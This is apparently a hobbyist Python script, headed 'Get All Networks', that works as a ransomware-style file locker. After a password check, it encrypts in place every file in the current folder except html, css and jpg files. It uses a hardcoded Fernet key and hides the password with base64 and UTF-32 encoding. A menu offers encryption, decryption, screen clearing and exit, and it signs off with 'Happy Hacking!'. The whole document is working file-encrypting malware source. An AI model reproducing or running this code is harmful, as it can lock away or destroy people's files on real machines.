# Get All Networks
# Python3
# ***************************
# Author : MrWhitehat
# Created : 3 - 7 - 2024
# Last Modified : 3 - 7- 2024
# ***************************
from cryptography.fernet import Fernet
import base64 as FindTheGib
import os
import sys


def ChangeConsoleColor():
	os.system("color 0a")
def GibrisCode():
	return b'tdaXcgqSYW3ugtQdNikM-FtlRlcltNzuzI7XuqtpI-8='


def SortMyFolder():
	FileLocker = []
	Lst = os.listdir()
	Ext = ["html","css","jpg"]
	for file in Lst:
		if os.path.isfile(file):
			if (file.split(".")[1].strip() not in Ext) and (file!="Enc.py"):
				FileLocker.append(file)
	Ack = input("[*] Do You Want To Encrypt The File:")
	if Ack == "Yes":
		for file in FileLocker:
			with open(file,'rb') as File:
				Content = File.read()
				File.close()
			Enc = CryptFiles(Content)
			with open(file,'wb') as File:
				File.write(Enc)
				File.close()
			print("[ + ] File Encrypted ! +",file)
	else:
		print(FileLocker)
		print("[ ! ] Thnak You !")
StringMethod =b'//4AADIAAAA5AAAAMAAAADAAAAA=amhyZWlvaGlmamlqaXJqaQ=='
def IsAccess():
	try:	
		Pass = input(str("[ $ ] Enter the Password :"))
		if str(Pass) == str(FindTheGib.b64decode(StringMethod[0:28]).decode("utf-32")):
			print("[ + ] Access Granted !")
			if(os.name=="nt"):
		 		os.system("cls")
			else:
				os.system("clear")
			return True
		else:
			print(" [ ! ] No Access")
			return False
	except:
		return False

def CryptFiles(content):
	return Fernet(GibrisCode()).encrypt(content)
def DecryptPass(content):
	return Fernet(GibrisCode()).decrypt(content)
def Recovery():
	Lst = os.listdir()
	FileLocker = []
	Ext = ["html","css","jpg"]
	print(" [ + ] Length Of the FileLocker:",len(FileLocker))
	for file in Lst:
		if os.path.isfile(file):
			if (file.split(".")[1].strip() not in Ext) and (file!="Enc.py") and (file!="Enc.exe"):
				FileLocker.append(file)
				print('[ * ] File Found :',file)
	for file in FileLocker:
		try:
			with open(file,'rb') as File:
				Content = File.read()
				File.close()
			Dec = DecryptPass(Content)
			with open(file,'wb') as File:
				File.write(Dec)
				File.close()
			print(" [ ! ] File Decrypted SuccessFull! +",file)
		except:
			print(" [ ! ]Error In the Decrypting File + ",file)
Access = IsAccess()
def cls():
	if os.name=="nt":
		os.system("cls")
	else:
		os.system("clear")
ChangeConsoleColor()
while Access:
	inp = input("Console > ")
	if inp == "1":
		ack = input("[ ! ] Do You Want To Encrypt : ")
		if ack.strip()=="yes":
			SortMyFolder()
	elif inp=="2":
		print("[ + ] Recovery Proc [ ^ ]")
		Recovery()
	elif inp.lower().strip()=="help":
			print(" [ 1 ] Encrypt File - EnCrypt File ")
			print(" [ 2 ] Decrypt File - Recover Files ")
			print(" [ 3 ] Clear the Screen - type Clear to Clear Screen")
			print(" [ 4 ] Exit - type exit to Stop Console")
	elif inp=="exit":
		print("Happy Hacking !")
		Access = False
		break
	elif inp.lower().strip() == "clear":
		cls()
	else:
		print("[ * ] Invalid Options")
